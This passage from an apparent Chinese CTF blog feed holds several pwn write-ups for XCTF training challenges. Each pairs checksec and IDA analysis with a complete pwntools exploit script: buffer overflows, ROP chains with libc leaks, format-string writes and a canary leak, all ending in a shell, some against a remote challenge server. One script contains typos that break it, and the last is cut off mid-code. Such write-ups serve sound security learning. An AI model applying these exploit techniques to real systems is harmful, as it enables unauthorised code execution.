来泄漏地址.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912231313.png" alt="ROP链示意" style="zoom:80%;" /><br>通过<code>ROPgadet</code>在程序中找到<code>pop</code>片段的起始地址为<code>0x40089C</code>–&gt;<code>pop_4_ret = 0x40089C</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912232400.png" alt="pop_4_ret" style="zoom:80%;" /><br>然后通过<code>LibcSearcher</code>由上述<code>payload</code>泄漏出的地址找到对应的<code>libc</code>, 利用<code>libc</code>中的<code>system</code>等来<code>getshell</code>. 第二次溢出<code>getshell</code>的<code>payload</code>与泄漏<code>libc</code>的相似.<br>完整exp如下所示.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> <span class="token number">0x4007CD</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x4008A3</span>pop_4_ret <span class="token operator">=</span> <span class="token number">0x40089C</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_4_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'RCTF'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x40'</span><span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span> write_addr<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>str_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_4_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payloady<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-pwnstack</title>
      <link href="/ctf-pwn/3979423f.html"/>
      <url>/ctf-pwn/3979423f.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目打开于2023年9月12日16:48:06, wp完成于2023年9月12日20:32:44</p></blockquote><p>很简单的一道栈溢出, checksec检查, 没有开什么保护<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912202044.png" alt="checksec检查" style="zoom:80%;" /><br>查一下字符串, <code>system</code>, <code>/bin/sh</code>都有.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912202444.png" alt="检索字符串" style="zoom:80%;" /><br><code>backdoor</code>函数, 函数地址<code>0x400762</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912202652.png" alt="backdoor函数" style="zoom:80%;" /></p><p>有<code>read</code>函数, 直接溢出即可<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230912202558.png" alt="溢出点" style="zoom:80%;" /></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span><span class="token comment"># sh = process('./pwn2')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">56486</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x400762</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">160</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'this is pwn1,can you do that??'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-实时数据监测</title>
      <link href="/ctf-pwn/31354e41.html"/>
      <url>/ctf-pwn/31354e41.html</url>
      
        <content type="html"><![CDATA[<p>很有意思的一道题<br>checksec检查看有没有开启保护, 32位, 嘛也没开<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905215721.png" style="zoom:80%;" /><br>运行一下, 随便输入后会有输出, 然后给出key的地址<code>0x804a048</code>, 以及key的值不是<code>0x02223322</code>, 结合题目描述, 要想办法修改key的值.<br>上IDA, 进入<code>locker()</code>函数, 只要<code>key==0x2223322</code>就会执行<code>system(&#39;/bin/sh&#39;)</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905220313.png" style="zoom:80%;" /><br>进入<code>imagemagic()</code>函数发现存在格式化字符串漏洞<code>printf</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905220503.png" style="zoom:80%;" /><br>想到利用<code>%n</code>去修改变量的值. 需要去找到输入参数在栈中的偏移量.通过<code>%p</code>来读取16进制值, <code>aaa</code>在栈中的偏移为12.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905220932.png" alt="image.png"><br>根据以上信息就可以构造payload:<code>payload = p32(key_addr) + b&#39;a&#39; * (0x2223322 - 4) + b&#39;%12$n&#39;</code> , 这是的payload在逻辑上没有问题, 但是执行时却会因为输入的a太多而不可行.可以用pwntools自带的<code>fmtstr_payload</code>来构造如下payload:<code>payload = fmtstr_payload(12, &#123;key_addr:0x2223322&#125;)</code><br>也可以利用<code>h</code>与<code>hh</code>来构造,<code>hhn</code> 写入的就是单字节，<code>hn</code>写入的就是双字节</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>key_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">b'%18x'</span> <span class="token operator">+</span> <span class="token string">b'%12$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%17x'</span> <span class="token operator">+</span> <span class="token string">b'%13$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%239x'</span> <span class="token operator">+</span> <span class="token string">b'%14$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%224x'</span> <span class="token operator">+</span> <span class="token string">b'%15$hhn'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>四个p32()是16字符, 然后加上18是34也就是<code>0x22</code>, 在加上17就是51也就是<code>0x33</code>, 再加上239就是290也就是<code>0x122</code>, 然后再加224就是514也就是<code>0x202</code>, 由于hhn写入的是单字节, 依次得到<code>0x22, 0x33, 0x22, 0x02</code>, 又因为小端存储就会得到<code>0x02223322</code>.<br>完整payload如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./datacheck'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./datacheck'</span><span class="token punctuation">)</span><span class="token comment"># sh = remote('61.147.171.105', 65420)</span>key_addr <span class="token operator">=</span> <span class="token number">0x0804a048</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>key_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>key_addr <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span>payload <span class="token operator">+=</span><span class="token string">b'%18x'</span> <span class="token operator">+</span> <span class="token string">b'%12$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%17x'</span> <span class="token operator">+</span> <span class="token string">b'%13$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%239x'</span> <span class="token operator">+</span> <span class="token string">b'%14$hhn'</span> <span class="token operator">+</span> <span class="token string">b'%224x'</span> <span class="token operator">+</span> <span class="token string">b'%15$hhn'</span><span class="token comment"># payload1 = fmtstr_payload(12, &#123;key_addr:0x2223322&#125;)</span><span class="token comment"># paylaod2 = p32(key_addr) + b'a' * (0x2223322 - 4) + b'%12$n'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-pwn200</title>
      <link href="/ctf-pwn/7654e13.html"/>
      <url>/ctf-pwn/7654e13.html</url>
      
        <content type="html"><![CDATA[<p>checksec查看附件, 32位小端程序, 开启数据不可执行<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905224945.png" alt="image.png"><br>IDA打开后也没有<code>system</code>等, 有<code>write</code>函数, 猜测是要泄漏libc地址.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905225139.png" alt="image.png"><br>主函数中存在write函数<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905225322.png" alt="image.png"><br>跟进<code>sub_8048484</code>, 里面有read函数, 且可以溢出<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230905225407.png" alt="image.png"><br>至此, 思路就比较清晰了, 通过write函数来泄漏libc地址, 然后找到<code>system, bin/sh</code>来getshell.<br>exp如下所示, 但是存在的问题是用LibcSearcher找到的libc库无法利用, 整个exp逻辑上毫无问题, 最后也是找其他师傅的wp看了一下几个地址, 这里还是存在一些小问题</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn200'</span><span class="token punctuation">)</span><span class="token comment"># sh = process('./pwn200')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">58215</span><span class="token punctuation">)</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>main_addr <span class="token operator">=</span> <span class="token number">0x80484BE</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">108</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span> <span class="token operator">+</span> \            p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span>\            <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Welcome to XDCTF2015~!\n"</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># libc = LibcSearcher('write', write_addr)</span><span class="token comment"># libc_base = write_addr - libc.dump('write')</span><span class="token comment"># system_addr = libc_base + libc.dump('system')</span><span class="token comment"># str_bin_sh = libc_base + libc.dump('str_bin_sh')</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span> <span class="token number">0xD43C0</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3A940</span>str_bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x15902B</span><span class="token comment"># payload1 = b'a' * 108 + p32(str_bin_sh) + p32(system_addr)</span>payload1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x70</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>str_bin_sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span> payload1<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-mary-morton</title>
      <link href="/ctf-pwn/9dff28e7.html"/>
      <url>/ctf-pwn/9dff28e7.html</url>
      
        <content type="html"><![CDATA[<p><em>最后完成月2023年9月4号</em></p><p>泄漏canary地址<br>存在canary保护<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724083626.png" style="zoom:80%;" /> </p><p>存在system<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724085322.png"  style="zoom:80%;" /></p><p>程序大致的逻辑就是选择一个选项，然后输入，存在两处输入输出，使用了read和printf，第一处中read无法溢出，但是printf存在格式化字符串漏洞，可以组合泄露出canary的地址<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724083831.png" alt="0" style="zoom:80%;" /></p><p>在函数sub_400960，read函数可以溢出，可以通过之前泄漏的canary值来构造payload<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724084040.png" style="zoom:80%;" /></p><p>通过printf泄漏canary的地址，但是在泄漏地址时没有注意%x是输出一个八字节的数，而我算偏移的时候按照单字节算了，而且也没有考虑输入的数据在栈中的偏移，直接拿输入和canary的相对偏移来作为绝对偏移。<br>通过格式化printf输出可以得到buf在栈中的偏移为6<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724084815.png" style="zoom:80%;" /><br>在栈中buf在0x90出，canary在0x8出，相距0x88，也就是136，在64位环境下，%X输出8字节，136&#x2F;8&#x3D;17,17+6&#x3D;23，因此canary在栈中的偏移为23。<br>完整exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process("./mary_morton")</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">60921</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">b"%23$p"</span>sys_addr <span class="token operator">=</span> <span class="token number">0x4008DA</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"3. Exit the battle"</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>canary<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"3. Exit the battle"</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-反应釜开关</title>
      <link href="/ctf-pwn/c42410d2.html"/>
      <url>/ctf-pwn/c42410d2.html</url>
      
        <content type="html"><![CDATA[<p>(简单的栈溢出)<br>checksec查看附件如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904210354.png" style="zoom:80%;" /><br>开启了内存不可执行以及部分重定位. 直接运行本程序, 如图所示, 题目中直接给出了一个地址, 不知道能不能利用.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211159.png" style="zoom:80%;" /><br>用IDA打开附件查看, 逻辑比较清晰, 其中有<code>system(&#39;/bin/sh&#39;)</code>, 而且有<code>gets</code>函数, 可以直接溢出然后跳转执行.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211836.png" style="zoom:80%;" /><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230904211856.png" style="zoom:80%;" /><br><code>v5</code>长度为512, 构造payload<code>b&#39;a&#39; * 512 + b&#39;a&#39; * 8 + p64(shell_addr)</code><br>完整exp如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment"># sh = process('./fanyin')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">51859</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./fanyin'</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x4005F6</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">512</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn-pwn1</title>
      <link href="/ctf-pwn/1bdd2aa8.html"/>
      <url>/ctf-pwn/1bdd2aa8.html</url>
      
        <content type="html"><![CDATA[<p>checksec检查<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230817212438.png"  style="zoom:50%;" /><br>除了PIE外所有保护全开.<br>程序的大致逻辑是一个输入输出, 先将输入存储到缓冲区, 然后再输出<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902210031.png"  style="zoom: 80%;" /></p><p>IDA打开后程序的主逻辑如下:<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902210914.png"  style="zoom: 80%;" /><br>程序中没有发现<code>system</code>函数以及<code>bin/sh</code>等, 只有<code>read</code>, <code>puts</code>, <code>write</code>. 附件中给出了<code>libc</code>, <code>libc</code>中有可利用的<code>execve</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902211303.png"  style="zoom: 80%;" /><br>大致思路是要通过主程序去泄漏出<code>libc</code>的基地址, 然后通过libc中的<code>execve</code>去get shell.<br>因为开启了canary, 首先要去找到canary的值, 由于输入值和canary的值在栈中相邻, 因此可以通过puts函数泄漏出canray的值.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902212752.png"  style="zoom: 80%;" /><br>可以第一步输入<code>&#39;a&#39; * 0x88</code>, 然后第二步输出时泄漏canary的地址. 但是因为在发送<code>&#39;a&#39; * 0x88</code>时会在末尾追加<code>\n</code>, 因此会将canary低位的<code>\x00</code>覆盖掉, 所以还要还原.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902214043.png"  style="zoom:50%;" /><br>在得到canary的值后, 就需要去泄漏出libc的基地址. 因为程序中有使用到<code>puts</code>函数, 所以通过调用<code>puts</code>函数去计算出<code>puts</code>函数的地址, 然后通过<code>plt</code>, <code>got</code>表的调用关系去计算出libc的基地址. 然后再算出运行时<code>execve</code>的地址, 来进行调用.<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230902214739.png"   /></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>  <span class="token comment"># sh = process('./babystack')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'61.147.171.105'</span><span class="token punctuation">,</span> <span class="token number">49628</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>execve_addr <span class="token operator">=</span> <span class="token number">0x45216</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> <span class="token number">0x400908</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400A93</span>sh<span class="token 